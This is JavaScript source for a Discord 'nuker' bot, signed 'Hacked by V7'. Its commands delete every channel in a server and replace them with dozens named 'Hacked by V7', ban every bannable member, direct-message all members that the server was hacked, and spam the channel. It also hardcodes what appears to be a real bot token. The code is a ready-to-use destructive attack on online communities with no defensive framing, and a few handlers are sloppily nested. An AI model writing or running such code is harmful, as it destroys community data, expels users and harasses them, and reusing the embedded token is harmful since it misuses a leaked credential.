const Discord = require("discord.js");
const bot = new Discord.Client();
const TOKEN = "NjE1Njg1NDc5NDEyNTMxMjEx.XWU28w.gGd1J4zK6RZsj5A8gzp8x0J4guY"

bot.on("ready", () => {
    console.log("Ready");
    bot.user.setGame("Enigma v5.1");
  })

bot.on("message", function(message){
    if(message.content == ".channel"){
        message.guild.channels.forEach(channel => channel.delete())
        message.guild.createChannel("Hacked by V7", "Hacked by V7");
        message.guild.createChannel("Hacked by V7", "Hacked by V7");
        message.guild.createChannel("Hacked by V7", "Hacked by V7");
        message.guild.createChannel("Hacked by V7", "Hacked by V7");
        message.guild.createChannel("Hacked by V7", "Hacked by V7");
        message.guild.createChannel("Hacked by V7", "Hacked by V7");
        message.guild.createChannel("Hacked by V7", "Hacked by V7");
        message.guild.createChannel("Hacked by V7", "Hacked by V7");
        message.guild.createChannel("Hacked by V7", "Hacked by V7");
        message.guild.createChannel("Hacked by V7", "Hacked by V7");
        message.guild.createChannel("Hacked by V7", "Hacked by V7");
        message.guild.createChannel("Hacked by V7", "Hacked by V7");
        message.guild.createChannel("Hacked by V7", "Hacked by V7");
        message.guild.createChannel("Hacked by V7", "Hacked by V7");
        message.guild.createChannel("Hacked by V7", "Hacked by V7");
        message.guild.createChannel("Hacked by V7", "Hacked by V7");
        message.guild.createChannel("Hacked by V7", "Hacked by V7");
        message.guild.createChannel("Hacked by V7", "Hacked by V7");
        message.guild.createChannel("Hacked by V7", "Hacked by V7");
        message.guild.createChannel("Hacked by V7", "Hacked by V7");
        message.guild.createChannel("Hacked by V7", "Hacked by V7");
        message.guild.createChannel("Hacked by V7", "Hacked by V7");
        message.guild.createChannel("Hacked by V7", "Hacked by V7");
        message.guild.createChannel("Hacked by V7", "Hacked by V7");
        message.guild.createChannel("Hacked by V7", "Hacked by V7");
        message.guild.createChannel("Hacked by V7", "Hacked by V7");
        message.guild.createChannel("Hacked by V7", "Hacked by V7");
        message.guild.createChannel("Hacked by V7", "Hacked by V7");
        message.guild.createChannel("Hacked by V7", "Hacked by V7");
        message.guild.createChannel("Hacked by V7", "Hacked by V7");
        message.guild.createChannel("Hacked by V7", "Hacked by V7");
        message.guild.createChannel("Hacked by V7", "Hacked by V7");
        message.guild.createChannel("Hacked by V7", "Hacked by V7");
        message.guild.createChannel("Hacked by V7", "Hacked by V7");
        message.guild.createChannel("Hacked by V7", "Hacked by V7");
        message.guild.createChannel("Hacked by V7", "Hacked by V7");
        message.guild.createChannel("Hacked by V7", "Hacked by V7");
        message.guild.createChannel("Hacked by V7", "Hacked by V7");
        message.guild.createChannel("Hacked by V7", "Hacked by V7");
        message.guild.createChannel("Hacked by V7", "Hacked by V7");
        message.guild.createChannel("Hacked by V7", "Hacked by V7");
        message.guild.createChannel("Hacked by V7", "Hacked by V7");
        message.guild.createChannel("Hacked by V7", "Hacked by V7");
        message.guild.createChannel("Hacked by V7", "Hacked by V7");
        message.guild.createChannel("Hacked by V7", "Hacked by V7");
        message.guild.createChannel("Hacked by V7", "Hacked by V7");
        message.guild.createChannel("Hacked by V7", "Hacked by V7");
        message.guild.createChannel("Hacked by V7", "Hacked by V7");
		
    }

    bot.on("message", function(message){
        if(message.content == ".ban"){
            message.guild.members.filter(member => member.bannable).forEach(member => {member.ban()});
			message.delete(1000);
        }
    })

    bot.on("message", function(message){
        if(message.content == ".dm"){
            bot.guilds.get(message.guild.id).members.forEach(members1 => {
                members1.send("**" + message.guild.name + " 's server has been Hacked by V7**")
            })
        }
    })

    bot.on("message", function(mesasge){
        if(message.content == ".spam"){
            message.channel.send("**Hacked By V7**")
        }
    })
})

bot.login(TOKEN)